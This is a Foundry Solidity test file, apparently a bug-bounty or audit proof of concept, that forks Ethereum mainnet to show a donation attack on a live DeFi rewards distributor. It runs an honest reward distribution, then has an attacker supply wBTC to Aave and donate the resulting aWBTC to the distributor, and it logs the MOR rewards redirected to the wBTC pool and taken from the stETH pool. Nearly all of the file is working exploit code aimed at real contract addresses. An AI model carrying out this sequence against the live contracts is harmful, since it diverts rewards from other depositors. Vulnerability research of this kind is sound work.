// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); }
interface IDistrib {
    function distributeRewards(uint256) external;
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function getDistributedRewards(uint256,address) external view returns (uint256);
    function depositPools(uint256,address) external view returns (
        address token, string memory chainLinkPath, uint256 tokenPrice, uint256 deposited,
        uint256 lastUnderlyingBalance, uint8 strategy, address aToken, bool isExist);
    function undistributedRewards() external view returns (uint256);
}
interface IAavePool { function supply(address,uint256,address,uint16) external; }
interface ICL { function getPathId(string memory) external pure returns (bytes32); function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256); }

contract DonationSkew is Test {
    IDistrib constant D = IDistrib(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CL = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    address[5] POOLS = [
        0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790, // stETH (winner, NONE)
        0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384, // wETH
        0xdE283F8309Fd1AA46c95d299f6B8310716277A42, // wBTC (attacker target, AAVE)
        0x6cCE082851Add4c535352f596662521B4De4750E, // USDC
        0x3B51989212BEdaB926794D6bf8e9E991218cf116  // USDT
    ];
    string[5] NAMES = ["stETH","wETH","wBTC","USDC","USDT"];

    // keep ChainLink prices fresh across the warp so updateDepositTokensPrices doesn't return 0
    function _mockPrices() internal {
        // mock every getChainLinkDataFeedLatestAnswer to a sane 1e18-scaled value per path is complex;
        // instead mock the consumer decimals/answer via low-level: not needed if warp < staleness.
    }

    function _snapDist() internal view returns (uint256[5] memory d) {
        for (uint256 i; i < 5; i++) d[i] = D.getDistributedRewards(0, POOLS[i]);
    }

    function test_redirect() public {
        vm.createSelectFork(vm.envOr("ETH_RPC", string("https://ethereum-rpc.publicnode.com")), 25996939);
        // capture each pool's real price BEFORE warp, then mock per-path so prices stay fresh
        for (uint256 i; i < 5; i++) {
            (, string memory path, , , , , , bool ex) = D.depositPools(0, POOLS[i]);
            if (!ex) continue;
            bytes32 pid = ICL(CL).getPathId(path);
            uint256 px = ICL(CL).getChainLinkDataFeedLatestAnswer(pid);
            vm.mockCall(CL, abi.encodeWithSelector(ICL.getChainLinkDataFeedLatestAnswer.selector, pid), abi.encode(px));
        }
        // advance past minRewardsDistributePeriod since last real distribution
        uint128 lastCalc = D.rewardPoolLastCalculatedTimestamp(0);
        uint256 minP = D.minRewardsDistributePeriod();
        uint256 target = uint256(lastCalc) + minP + 100;
        if (block.timestamp < target) vm.warp(target);

        uint256 snap = vm.snapshot();

        // -------- BASELINE: honest distributeRewards --------
        uint256[5] memory before_ = _snapDist();
        D.distributeRewards(0);
        uint256[5] memory afterB = _snapDist();
        emit log("=== BASELINE (no donation) distributedRewards delta ===");
        uint256 totB;
        for (uint256 i; i < 5; i++) { uint256 dlt = afterB[i]-before_[i]; totB += dlt; emit log_named_uint(NAMES[i], dlt); }
        emit log_named_uint("TOTAL distributed", totB);

        // -------- ATTACK: donate aWBTC then distribute --------
        vm.revertTo(snap);
        address attacker = makeAddr("ATTACKER");
        // attacker acquires aWBTC by supplying wBTC to Aave (realistic, no privilege)
        uint256 donateWbtc = 4_000_000; // 0.04 wBTC ~ $3.1k
        deal(WBTC, attacker, donateWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(address(AAVE), donateWbtc);
        AAVE.supply(WBTC, donateWbtc, attacker, 0);
        // find aWBTC token
        (, , , , , , address aWBTC, ) = D.depositPools(0, POOLS[2]);
        uint256 aBal = IERC20(aWBTC).balanceOf(attacker);
        emit log_named_uint("attacker aWBTC acquired", aBal);
        IERC20(aWBTC).transfer(address(D), aBal); // DONATION into Distributor
        vm.stopPrank();

        uint256[5] memory before2 = _snapDist();
        D.distributeRewards(0);
        uint256[5] memory afterA = _snapDist();
        emit log("=== ATTACK (aWBTC donated) distributedRewards delta ===");
        uint256 totA;
        for (uint256 i; i < 5; i++) { uint256 dlt = afterA[i]-before2[i]; totA += dlt; emit log_named_uint(NAMES[i], dlt); }
        emit log_named_uint("TOTAL distributed", totA);

        uint256 wbtcBase = afterB[2]-before_[2];
        uint256 wbtcAtk = afterA[2]-before2[2];
        emit log("=== RESULT ===");
        emit log_named_uint("wBTC pool got (baseline)", wbtcBase);
        emit log_named_uint("wBTC pool got (attack)", wbtcAtk);
        emit log_named_uint("EXTRA MOR redirected to wBTC pool", wbtcAtk > wbtcBase ? wbtcAtk-wbtcBase : 0);
        emit log_named_uint("stETH pool LOST (baseline-attack)", (afterB[0]-before_[0]) > (afterA[0]-before2[0]) ? (afterB[0]-before_[0])-(afterA[0]-before2[0]) : 0);
    }
}
